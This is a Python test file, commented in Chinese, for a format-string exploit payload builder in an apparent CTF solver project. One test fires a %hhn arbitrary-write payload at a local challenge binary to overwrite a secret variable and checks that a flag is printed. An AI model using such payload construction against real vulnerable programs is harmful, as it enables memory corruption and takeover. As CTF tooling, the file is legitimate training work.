#!/usr/bin/env python3
"""%hhn 写入器测试：参数位必须与实际布局一致（这正是 fmtstr_payload 出错的地方）。"""
import os
import re
import sys

BASE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(BASE, '..'))
sys.path.insert(0, os.path.join(ROOT, 'pwn_solver'))

import pytest  # noqa: E402

import fmtwriter  # noqa: E402


def test_payload_actually_pwns_the_local_fmtstr_challenge():
    """对着真实目标验证：写入器算的参数位必须真的能改掉 secret。

    challenges/fmtstr: printf(buf) 后 `if (secret == 0xdeadbeef) win()`，
    而非 PIE 下 secret 在 0x40406c。这是"参数位算对没有"的最终裁判 ——
    比任何自我推导的不变量都可靠（pwntools fmtstr_payload 就栽在这一步）。
    """
    binary = os.path.join(ROOT, 'challenges', 'fmtstr')
    if not os.path.exists(binary):
        pytest.skip('缺少 challenges/fmtstr 二进制')
    pwntools = pytest.importorskip('pwn')
    bin_sh = os.path.join(ROOT, 'challenges', 'fmtstr')
    payload = fmtwriter.build_payload(6, {0x40406c: 0xdeadbeef})
    p = pwntools.process(bin_sh)
    try:
        try:
            p.recvuntil(b'string: ', timeout=2)
        except Exception:
            pass
        p.sendline(payload)
        try:
            out = p.recvall(timeout=3)
        except Exception:
            out = b''
    finally:
        p.close()
    assert b'FLAG{' in out or b'flag{' in out, f'写入未生效，输出尾部: {out[-120:]!r}'


def test_written_bytes_are_cumulative_and_ordered():
    """按字节值升序写：累计打印量的低 8 位最终等于各目标字节。"""
    payload = fmtwriter.build_payload(6, {0x40406c: 0xdeadbeef})
    printed = 0
    seen = []
    for m in re.finditer(rb'%(?:(\d+)c)?%(\d+)\$hhn', payload):
        pad = int(m.group(1)) if m.group(1) else 0
        printed = (printed + pad) & 0xff
        seen.append(printed)
    assert sorted(seen) == sorted({0xef, 0xbe, 0xad, 0xde}), f'写入的字节值: {[hex(x) for x in seen]}'


def test_long_value_uses_enough_bytes():
    """libc 偏移（6 字节）不能被截断成 4 字节。"""
    payload = fmtwriter.build_payload(6, {0x404018: 0x7f1234567890})
    assert payload.count(b'$hhn') == 6


def test_empty_writes_is_empty_payload():
    assert fmtwriter.build_payload(6, {}) == b''
